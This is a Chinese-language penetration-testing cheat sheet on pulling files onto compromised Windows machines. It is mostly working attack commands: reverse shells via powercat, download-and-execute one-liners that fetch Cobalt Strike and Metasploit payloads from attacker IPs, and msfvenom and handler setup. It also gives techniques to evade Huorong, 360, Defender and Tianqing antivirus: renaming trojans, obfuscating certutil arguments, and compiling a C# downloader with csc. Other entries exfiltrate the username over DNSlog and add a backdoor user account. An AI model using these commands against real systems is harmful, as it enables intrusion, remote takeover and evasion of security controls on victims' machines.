# **windows远程下载**

### **常规下载**

**FTP**

注意：火绒会拦截

把下面内容复制到a.txt文件中

```
ftp 
open 1.1.1.1 21 #与1.1.1.1的21端口建立连接
use    #以use用户命登录
passwd #密码
bin #切换为二进制格式传输
get a.exe #复制根目录下的a.exe
bye#结束
然后使用ftp -s:a.txt 进行连接
```

**Curl**

curl是一个命令行访问URL的计算机逻辑语言的工具，发出网络请求，然后得到数据并提取出，显示在标准输出“stdout”上面，可以用它来构造http request报文，curl(CommandLine Uniform Resource Locator),即在命令行中利用URL进行数据或者文件传输。

```
curl -o C:\temp\geek.exe  http://192.168.31.205/geek.exe
```

**Certutil**

windows下一款下载文件的工具，自从WindowsServer 2003就自带。但是在Server 2003使用会有问题。

也就是说，以下命令是在Win7及其以后的机器使用。但是该命令的使用会引发杀毒软件的查杀，所以在实际渗透中几乎不适用该命令。

```
certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe #下载文件到当前目录下 
certutil -urlcache -split -f http://10.6.54.194:8000/reverse.exe c:/users/staccato/desktop/reserver.exe        #下载文件到指定目录下
```

**iwr**

iwr是PowerShell下的一款工具，所以我们如果在cmd下执行该命令的话，需要在前面加powershell命令；

但是这会被安全软件检测到。所以在执行前，先进入powershell下。

```
iwr -Uri http://www.test.com/vps.exe -OutFile vps.exe -UseBasicParsing 
powershell iwr -Uri http://www.test.com/vps.exe  -OutFile c:\users\gao\desktop\1.exe -UseBasicParsing
```

**bitsadmin**

bitsadmin 可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。

bitsadmin的一些特性：

bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。

bitsadmin 可以跟随URL跳转.

bitsadmin 不像curl wget 这类工具那样能用来下载HTML页面。

使用：

```
bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe c:\users\staccato\desktop\reverse.exe
# "任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。 

#默认情况下bitsadmin下载速度极慢，下载较大文件需要设置优先级提速 
start bitsadmin /transfer test http://10.6.54.194:8000/reverse.exe  f:\reverse.exe 
bitsadmin /setpriority test foreground     #设置任务test为最高优先级
```

**反弹NC shell**

亲测所有机器都适用

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.6.54.194 -p 8888 -e cmd

powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient)DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.6.54.194  -p 8888 -e cmd.exe"
```

**powershell**

**本地加载脚本并执行**

```
powershell -exec bypass Import-Module .\powerview.ps1;Get-NetDomain  #本地加载并执行PowerShell脚本
```

**远程加载脚本并执行**

```
powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://xx.xx.xx.xx/test.ps1')  
```

**反弹cs的powershell**

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.6.54.194:8080/a'))"   #后台运行 
powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.6.54.194:8080/a'))"
```

**WMIC下载并执行**

```
wmic PROCESS call create "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xxx.com/payload.ps1'))\"" 
```

**反弹msf的shell**

```
#VPS上操作
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.6.54.194 lport=7788 -f psh-reflection -o 7788.ps1        #生成木马文件 7788.ps1
python -m SimpleHTTPServer 80  #开启web服务
#MSF监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.6.54.194
set lport 7788
run

#目标机器上操作
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://http://10.6.54.194:8000/7788.ps1');xx.ps1"  #后台运行
或者
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.6.54.194:8000/7788.ps1');xx.ps1'
```

### **绕过杀软、EDR**

**浏览器下载**

前提条件：服务端出网、安装浏览器、获得到用户名

首先，将我们的免杀木马后缀改为 rar或者zip ，exe后缀需要认证才能下载。当然，还有大量的后缀可以使用，需要注意的是，这种后缀的文件必须是直接下载，而不是在浏览器中打开。

```
一般浏览器下载默认路径为： C:\Users\当前用户名字\Downloads\ 

通过dnslog外带当年用户名 
ping %USERNAME%.4e4ppf.dnslog.cn 
如果是powershell则 
cmd /c ping %USERNAME%.xb1y2y.dnslog.cn
```

讲木马名字改为zip或者rar、使用命令远程下载文件

```
使用默认浏览器下载 
pcalua -m -a http://192.168.31.205/geek.rar 
其他浏览器 
start msedge http://192.168.31.205/geek.rar 
start chrome http://192.168.31.205/geek.rar 
start firefox http://192.168.31.205/geek.rar
```

下载完成后、将文件重命名exe并运行

```
rename geek.rar geek.exe 
geek.exe 
或者 
start msedge http://192.168.31.205/geek.rar && ping -n 10 127.0.0.1 >NUL && rename geek.rar geek.exe && cmd /c geek.exe
```

如果更改路径、但如果更改了下载路径就很难受，因为上面那个是默认路径。

只能全盘搜索了,把搜索到的文件复制到c:\users\public\下。

命令如下：下载asdb.zip复制asdb.zip到c:\users\public\123456.exe

```
start msedge http://192.168.1.1:19900/NNNNnop.rar://192.168.1.1:19900/NNNNnop.rar && ping -n 10 127.0.0.1 >NUL && for /f %k in ('cmd /v:off /Q /c "for /f %i in (^'wmic logicaldisk get caption ^| findstr ":"^') do dir %i\ /b /s 2>nul | findstr "NNNNnop.rar""') do set kk=%k && (set dd=%kk:NNNNnop.rar=123456.exe%) && rename %k 123456.exe && ping -n 
```

**csc.exe**

这个是windows自带的可以编译c#语言、绕过EDR、需要管理员权限

文件下载的cs、写入文件到1.txt，存放路径要是可读写的路径

```
using System.Net;
namespace downloader
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string URLAddress = @"http://192.168.31.205/geek.exe"; //远程文件
            string receivePath = @"c:\geek.exe";//存放的位置，一定要是可读写执行位置
            client.DownloadFile(URLAddress, receivePath);
        }
    }
}
```

系统中.NET的版本可能不同，按实际情况判断

```
32位：C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe 
64位：C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
注意：在有些低版本windows可能没有这个版本则使用
32位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe 
64位：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe
```

将1.txt编译成下载2.exe的可执行文件

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe  /out:c:\1.exe c:\temp\1.txt 
执行后、在c盘文件下会有执行的木马文件
```

### **Certutil绕过方法**

**绕过火绒**

```
远程下载
"c""e""r""t""u""t""i""l" -"u""r""l""c""a""c""h""e" -split -f https://url/1.exe 1.exe
添加用户
copy c:\windows\system32\net1.exe aaa.txt
aaa.txt user xxxx 123456 /add
```

**bypass360**

```
360对 certutil 运行参数进行了动态检测，只要动态执行后的参数有 -urlcache 就拦截。那么把certutil复制换一个名字再去运行
copy c:\windows\system32\certutil.exe c.exe
c -urlcache -split -f http://192.168.31.205/geek.exe
```

**Defender 绕过**

```
certutil -url""""cache -split -f  http://192.168.31.205/geek.exe
```

**天擎绕过**

```
copy c:\windows\system32\certutil.exe c.exeverpatch.exe c.exe /s InternalName ""certutil -urlcache  -split -f http://xxx.com/dns.exe
```

### **其他方式**

https://mp.weixin.qq.com/s/-rN-rsnYRSKuJr5BkaRnBg

FTP 命令行下载 https://blog.csdn.net/qq_57163366/article/details/129438241